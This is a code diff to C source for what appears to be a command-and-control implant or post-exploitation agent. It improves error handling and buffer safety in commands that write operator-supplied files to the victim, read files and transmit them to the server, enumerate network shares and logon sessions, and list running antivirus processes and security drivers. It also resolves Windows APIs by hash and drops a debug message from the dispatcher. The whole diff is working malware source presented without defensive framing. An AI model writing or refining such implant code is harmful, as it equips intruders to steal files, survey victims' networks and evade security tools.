@@ -3,6 +3,7 @@
 #include "Resolve.h"
 #include "Hashes.h"
 #include <stdio.h>
+#include <stdarg.h>
 #include <tlhelp32.h>
 
 extern UINT32   g_AgentID;
@@ -64,6 +65,28 @@ UINT32 DetectEndianness(PVOID Buffer, UINT32 Size){
         return ENDIAN_LITTLE;
 
     return ENDIAN_LITTLE; // handler packer default
+}
+
+static int Append(char *buf, int cap, int pos, LPCSTR fmt, ...){
+    if (pos < 0 || pos >= cap)
+        return cap;
+
+    va_list ap;
+    va_start(ap, fmt);
+    int n = vsnprintf(buf + pos, cap - pos, fmt, ap);
+    va_end(ap);
+
+    if (n < 0 || n >= cap - pos)
+        return cap;
+
+    return pos + n;
+}
+
+static VOID SendText(LPCSTR msg){
+    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
+    if (!pkg) return;
+    PackageAddBytes(pkg, (PUCHAR)msg, strlen(msg));
+    PackageTransmit(pkg, NULL, NULL);
 }
 
 
@@ -180,17 +203,26 @@ VOID CommandUpload(PTASK_PARSER Parser){
     PVOID   content  = TaskParserGetBytes(Parser, &fileSize);
     DWORD   written  = 0;
 
-    if (!fileName || !content) return;
+    if (!fileName || !content){
+        SendText("upload: bad args");
+        return;
+    }
 
     CHAR nameBuf[MAX_PATH] = { 0 };
     if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
     memcpy(nameBuf, fileName, nameLen);
 
     HANDLE hFile = pCreateFile(nameBuf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
+    if (hFile == INVALID_HANDLE_VALUE){
+        SendText("upload: open failed");
         return;
+    }
 
-    pWrite(hFile, content, fileSize, &written, NULL);
+    if (!pWrite(hFile, content, fileSize, &written, NULL)){
+        pClose(hFile);
+        SendText("upload: write failed");
+        return;
+    }
     pClose(hFile);
 
     PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
@@ -218,28 +250,45 @@ VOID CommandDownload(PTASK_PARSER Parser){
     fn_Alloc       pAlloc = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
     fn_Free        pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
 
-    if (!pOpen || !pRead || !pSize || !pClose || !pAlloc) return;
+    if (!pOpen || !pRead || !pSize || !pClose || !pAlloc || !pFree) return;
 
     UINT32 nameLen  = 0;
     PCHAR  fileName = TaskParserGetBytes(Parser, &nameLen);
 
-    if (!fileName) return;
+    if (!fileName){
+        SendText("download: bad args");
+        return;
+    }
 
     CHAR nameBuf[MAX_PATH] = { 0 };
     if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
     memcpy(nameBuf, fileName, nameLen);
 
     HANDLE hFile = pOpen(nameBuf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
+    if (hFile == INVALID_HANDLE_VALUE){
+        SendText("download: open failed");
         return;
+    }
 
     DWORD fSize  = pSize(hFile, NULL);
-    PVOID fileBuf = pAlloc(LPTR, fSize);
-    DWORD dwRead  = 0;
+    if (fSize == INVALID_FILE_SIZE){
+        pClose(hFile);
+        SendText("download: size failed");
+        return;
+    }
 
+    PVOID fileBuf = pAlloc(LPTR, fSize ? fSize : 1);
+    if (!fileBuf){
+        pClose(hFile);
+        SendText("download: alloc failed");
+        return;
+    }
+
+    DWORD dwRead  = 0;
     if (!pRead(hFile, fileBuf, fSize, &dwRead, NULL)){
         pClose(hFile);
         pFree(fileBuf);
+        SendText("download: read failed");
         return;
     }
     pClose(hFile);
@@ -805,14 +854,14 @@ VOID CommandShares(PTASK_PARSER Parser){
         if (st != 0 && st != 234) break;
 
         SHARE_1A *s = (SHARE_1A*)buf;
-        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 256; i++){
+        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 1; i++){
             LPCSTR t = "?";
             DWORD tt = s[i].type & 0xFFF;
             if (tt == 0) t = "disk";
             else if (tt == 1) t = "print";
             else if (tt == 2) t = "dev";
             else if (tt == 3) t = "ipc";
-            pos += wsprintfA(out + pos, "%-20s %-5s %s\n", s[i].netname ? s[i].netname : "", t, s[i].remark ? s[i].remark : "");
+            pos = Append(out, (int)sizeof(out), pos, "%-20s %-5s %s\n", s[i].netname ? s[i].netname : "", t, s[i].remark ? s[i].remark : "");
         }
         if (buf) pFreeB(buf);
     } while (st == 234 && resume);
@@ -844,24 +893,24 @@ VOID CommandLogons(PTASK_PARSER Parser){
         DWORD read = 0, total = 0;
         st = pEnum(NULL, NULL, NULL, 10, &buf, (DWORD)-1, &read, &total, &resume);
         if (st == 5){
-            pos += wsprintfA(out + pos, "access denied (needs admin)\n");
+            pos = Append(out, (int)sizeof(out), pos, "access denied (needs admin)\n");
             break;
         }
         if (st != 0 && st != 234){
-            pos += wsprintfA(out + pos, "error %lu\n", st);
+            pos = Append(out, (int)sizeof(out), pos, "error %lu\n", st);
             break;
         }
         if (pos == 0)
-            pos += wsprintfA(out, "client           user          time  idle\n");
+            pos = Append(out, (int)sizeof(out), pos, "client           user          time  idle\n");
 
         SESSION_10A *s = (SESSION_10A*)buf;
-        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 256; i++)
-            pos += wsprintfA(out + pos, "%-16s %-13s %-5lu %lu\n", s[i].cname ? s[i].cname : "", s[i].user ? s[i].user : "", s[i].time, s[i].idle);
+        for (DWORD i = 0; i < read && pos < (int)sizeof(out) - 1; i++)
+            pos = Append(out, (int)sizeof(out), pos, "%-16s %-13s %-5lu %lu\n", s[i].cname ? s[i].cname : "", s[i].user ? s[i].user : "", s[i].time, s[i].idle);
         if (buf) pFreeB(buf);
     } while (st == 234 && resume);
 
     if (pos == 0)
-        pos += wsprintfA(out, "(no sessions)\n");
+        pos = Append(out, (int)sizeof(out), pos, "(no sessions)\n");
 
     PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
     PackageAddBytes(pkg, (PUCHAR)out, pos);
@@ -928,8 +977,7 @@ VOID CommandAvEnum(PTASK_PARSER Parser){
                 do {
                     for (int k = 0; k < (int)(sizeof(ProcKeys) / sizeof(ProcKeys[0])); k++){
                         if (Has(pe.szExeFile, ProcKeys[k])){
-                            if (pos < (int)sizeof(out) - 128)
-                                pos += wsprintfA(out + pos, "  %-6lu %s\n", pe.th32ProcessID, pe.szExeFile);
+                            pos = Append(out, (int)sizeof(out), pos, "  %-6lu %s\n", pe.th32ProcessID, pe.szExeFile);
                             break;
                         }
                     }
@@ -939,7 +987,7 @@ VOID CommandAvEnum(PTASK_PARSER Parser){
         }
     }
 
-    pos += wsprintfA(out + pos, "== drivers ==\n");
+    pos = Append(out, (int)sizeof(out), pos, "== drivers ==\n");
 
     if (psapi && pAlloc && pFree){
         fn_EnumDrivers pEnum = (fn_EnumDrivers)ResolveFuncH(psapi, H_EnumDeviceDrivers);
@@ -956,8 +1004,7 @@ VOID CommandAvEnum(PTASK_PARSER Parser){
                         if (!pName(base[i], dn, sizeof(dn))) continue;
                         for (int k = 0; k < (int)(sizeof(DrvKeys) / sizeof(DrvKeys[0])); k++){
                             if (Has(dn, DrvKeys[k])){
-                                if (pos < (int)sizeof(out) - 128)
-                                    pos += wsprintfA(out + pos, "  %s\n", dn);
+                                pos = Append(out, (int)sizeof(out), pos, "  %s\n", dn);
                                 break;
                             }
                         }
@@ -1038,17 +1085,12 @@ VOID CommandDispatcher(VOID){
                 if (cmd == COMMAND_NO_JOB)
                     break;
 
-                BOOL found = FALSE;
                 for (UINT32 i = 0; i < COMMAND_COUNT; i++){
                     if (CommandTable[i].ID == cmd){
                         CommandTable[i].Function(&Task);
-                        found = TRUE;
                         break;
                     }
                 }
-
-                if (!found)
-                    printf("[dispatch] unknown cmd: 0x%x\n", cmd);
             }
         }
 
